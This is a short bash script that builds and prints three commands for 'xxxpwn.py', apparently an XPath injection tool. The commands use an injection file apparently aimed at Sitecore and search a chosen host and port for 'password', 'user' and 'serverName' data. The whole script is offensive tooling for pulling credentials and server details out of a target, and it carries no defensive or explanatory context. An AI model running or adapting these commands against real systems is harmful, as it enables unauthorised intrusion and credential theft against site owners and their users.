#!/bin/bash

HOST=${1-"localhost"}
PORT=${2-"80"}
USESSL=''
if [ $# -lt 1 ]; then echo "$0 [HOST] {PORT}"; exit 1; fi
if (( $PORT==443 )); then USESSL="--ssl"; fi

echo python xxxpwn.py $USESSL -t6 --no_child --no_values --no_comments --no_processor --no_text --search "password" -H -i inject_sitecore.txt -m match $HOST $PORT
echo python xxxpwn.py $USESSL -t6 --no_child --no_values --no_comments --no_processor --no_text --search "user" -H -i inject_sitecore.txt -m match $HOST $PORT
echo python xxxpwn.py $USESSL -t6 --no_child --no_values --no_comments --no_processor --no_text --search "serverName" -H -i inject_sitecore.txt -m match $HOST $PORT


